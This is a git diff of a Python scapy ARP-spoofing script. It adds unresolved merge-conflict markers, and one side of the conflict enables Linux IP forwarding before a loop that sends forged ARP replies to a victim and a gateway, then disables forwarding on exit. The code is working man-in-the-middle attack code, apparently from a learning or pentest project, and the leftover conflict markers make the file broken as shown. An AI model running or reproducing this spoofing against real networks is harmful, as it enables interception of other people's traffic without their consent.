@@ -1,7 +1,11 @@
 #import libraries and modules
 import scapy.all as scapy
 import optparse
+<<<<<<< HEAD
 import sys, time
+=======
+import sys, time, subprocess
+>>>>>>> 695b3e43b82ffef8380e8ee9a27b645b5a320d56
 
 
 def get_args():
@@ -78,11 +82,20 @@ if __name__ == "__main__":
 
     packet_counter = 0
     try:
+<<<<<<< HEAD
         while True: #continuously sends fabricated ARP responses to keep own IP in ARP tables of victim and e.g. router
             arp_spoof(v_ip, s_ip)
             arp_spoof(s_ip, v_ip)
 
             packet_counter += 2 # 2 packets sent each iteration: 1 to victim IP and 1 to spoof IP
+=======
+        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+        while True:  #continuously sends fabricated ARP responses to keep own IP in ARP tables of victim and e.g. router
+            arp_spoof(v_ip, s_ip)
+            arp_spoof(s_ip, v_ip)
+
+            packet_counter += 2  #2 packets sent each iteration: 1 to victim IP and 1 to spoof IP
+>>>>>>> 695b3e43b82ffef8380e8ee9a27b645b5a320d56
 
             print(f"\r[+] Packets sent: {packet_counter}", end="")
             time.sleep(wait_time)
@@ -91,5 +104,9 @@ if __name__ == "__main__":
         print("\n[+] Shutting down program... Resetting ARP tables to original state... Please wait\n")
         reset_ARP(v_ip, s_ip)
         reset_ARP(s_ip, v_ip)
+<<<<<<< HEAD
+=======
+        subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
+>>>>>>> 695b3e43b82ffef8380e8ee9a27b645b5a320d56
         exit()
 
